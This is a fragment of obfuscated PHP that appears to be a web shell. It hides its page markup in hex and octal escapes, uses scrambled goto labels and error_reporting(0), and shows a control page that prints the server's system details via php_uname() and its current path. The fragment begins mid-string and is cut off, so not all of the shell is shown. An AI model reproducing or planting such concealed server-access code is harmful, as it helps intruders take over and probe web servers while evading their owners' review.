x32\x32\67\62\57\x69\x2f\62\60\61\66\x2f\x31\66\66\x2f\x63\x2f\144\57\x61\x64\x75\x6c\x74\x5f\x6e\x65\160\164\x75\156\x65\x5f\x6d\x69\x6e\x69\x6d\141\154\151\163\x74\137\x62\141\x63\x6b\147\x72\x6f\165\x6e\144\137\142\x79\137\167\145\x65\142\x6c\x6f\x72\x64\163\165\160\x72\x65\155\x65\55\x64\x61\x36\x65\x63\x31\63\56\160\156\x67\x29\x3b\xa\x9\143\165\x72\163\x6f\x72\x3a\40\165\x72\x6c\50\150\164\x74\x70\x3a\57\x2f\x63\x75\162\x2e\x63\x75\x72\163\x6f\x72\163\x2d\x34\165\x2e\x6e\x65\x74\57\143\165\x72\x73\157\x72\x73\57\143\x75\162\55\61\61\x2f\143\165\162\61\60\x32\65\56\141\x6e\x69\x29\54\40\x75\x72\x6c\x28\x68\x74\x74\x70\x3a\x2f\57\x63\165\x72\56\x63\x75\162\x73\x6f\x72\x73\55\64\x75\56\x6e\x65\164\x2f\x63\x75\x72\x73\x6f\162\163\57\143\165\x72\55\61\x31\57\143\165\x72\61\x30\62\65\x2e\160\x6e\x67\x29\54\40\x70\x72\x6f\147\x72\x65\x73\163\40\41\151\x6d\160\x6f\162\x74\141\x6e\x74\73\xa\x7d\12\43\143\157\x6e\x74\145\x6e\164\x20\164\x72\x3a\x68\157\x76\x65\162\173\12\142\141\143\153\x67\162\157\x75\156\x64\x2d\x63\157\x6c\x6f\162\x3a\40\x23\x38\x31\x38\x31\71\x39\73\12\164\145\x78\164\x2d\x73\150\x61\x64\157\167\72\x30\160\x78\x20\60\x70\170\40\x31\x30\x70\x78\40\x23\70\61\x38\61\x39\71\x3b\12\x7d\xa\43\x63\x6f\156\164\x65\156\164\x20\56\x66\x69\x72\163\164\x7b\xa\x62\141\x63\x6b\x67\x72\x6f\165\156\x64\x2d\143\157\x6c\157\x72\72\x20\43\70\x31\70\x31\71\x39\x3b\12\175\12\43\x63\x6f\x6e\x74\145\156\x74\40\56\146\x69\x72\163\164\x3a\150\x6f\x76\x65\x72\x7b\xa\142\x61\143\x6b\x67\x72\x6f\x75\x6e\144\55\x63\157\154\157\162\x3a\x20\x23\x38\x31\70\61\71\71\x3b\xa\164\x65\170\x74\55\163\150\x61\144\157\167\x3a\60\x70\x78\40\x30\160\x78\40\x31\160\x78\40\43\x46\x46\106\x46\x46\x46\73\xa\x7d\xa\x74\x61\x62\154\x65\x7b\xa\142\x6f\x72\144\x65\162\72\40\x31\160\x78\x20\x23\x38\x31\70\61\x39\x39\40\163\x6f\154\x69\x64\73\xa\175\12\110\x31\173\xa\146\x6f\156\164\x2d\x66\x61\155\151\x6c\x79\x3a\40\42\x52\x79\145\42\x2c\x20\143\x75\x72\x73\x69\x76\x65\x3b\12\175\xa\x61\x7b\12\143\x6f\154\157\162\72\40\43\146\x66\x66\73\12\164\145\170\x74\55\144\x65\x63\157\x72\x61\x74\151\x6f\x6e\x3a\x20\x6e\157\x6e\x65\x3b\12\x7d\xa\141\72\150\157\166\x65\x72\x7b\12\143\x6f\154\x6f\162\x3a\x20\x23\146\146\146\x3b\12\164\145\x78\x74\x2d\x73\x68\x61\x64\x6f\167\x3a\60\160\x78\x20\60\x70\170\40\61\x30\x70\x78\40\43\146\146\x66\x66\146\x66\x3b\12\x7d\12\151\156\160\165\164\x2c\x73\x65\154\145\x63\164\54\x74\145\170\164\x61\162\x65\x61\x7b\12\x62\157\x72\144\145\x72\x3a\x20\x31\x70\170\40\43\146\x66\x66\x20\163\x6f\154\151\144\x3b\12\x2d\x6d\157\172\55\142\x6f\x72\x64\145\x72\55\x72\x61\144\151\x75\x73\72\x20\x35\160\170\73\12\55\167\145\x62\153\151\x74\55\142\157\162\x64\145\162\x2d\162\x61\x64\151\x75\x73\x3a\x35\160\x78\73\xa\142\x6f\162\144\145\162\55\x72\x61\144\151\x75\163\x3a\x35\x70\170\x3b\xa\175\xa\x3c\57\x73\x74\x79\x6c\145\76\xa\x3c\x2f\110\105\x41\104\76\xa\x3c\x42\x4f\104\131\76\xa\12\x3c\x48\x31\76\74\143\145\156\164\x65\x72\76\x3c\x66\157\x6e\x74\x20\x63\157\154\x6f\x72\75\x20\x23\x66\146\x66\x20\x66\141\x63\145\x3d\143\x6f\165\x72\x69\x65\x72\x20\156\145\167\76\xe0\xa4\xb9\xe0\244\xb5\xe0\244\xbe\340\244\x88\40\340\244\205\xe0\244\241\xe0\245\x8d\xe0\xa4\xa1\xe0\xa4\xbe\x20\340\xa4\x95\340\xa4\xb9\xe0\xa4\xbe\340\244\x81\x20\340\xa4\xb9\340\xa5\210\77\x3c\x2f\x66\x6f\156\x74\76\x3c\57\x63\145\156\x74\x65\x72\76\74\x2f\110\61\x3e\xa\x3c\x74\141\x62\x6c\x65\x20\167\151\x64\164\x68\x3d\42\x37\x30\x30\42\40\x62\x6f\162\144\145\x72\75\x22\x30\42\x20\143\x65\x6c\x6c\160\141\x64\x64\151\156\x67\x3d\x22\63\42\40\143\x65\x6c\154\x73\x70\x61\143\x69\x6e\x67\x3d\x22\61\x22\x20\x61\154\151\x67\156\x3d\42\x63\145\156\164\x65\x72\42\x3e\xa\x3c\x74\162\76\74\x74\144\76\x53\171\x73\x74\x65\155\x3a\40\x3c\x62\x3e" . php_uname() . "\74\x2f\x62\x3e\x3c\x62\x72\76\x3c\x62\x72\x3e\x43\x75\162\x72\145\x6e\x74\x20\x50\x61\x74\x68\x20\x3a\x20"; goto lRlEr; b7HYI: error_reporting(0); goto Enuo2; Sbabu: ?>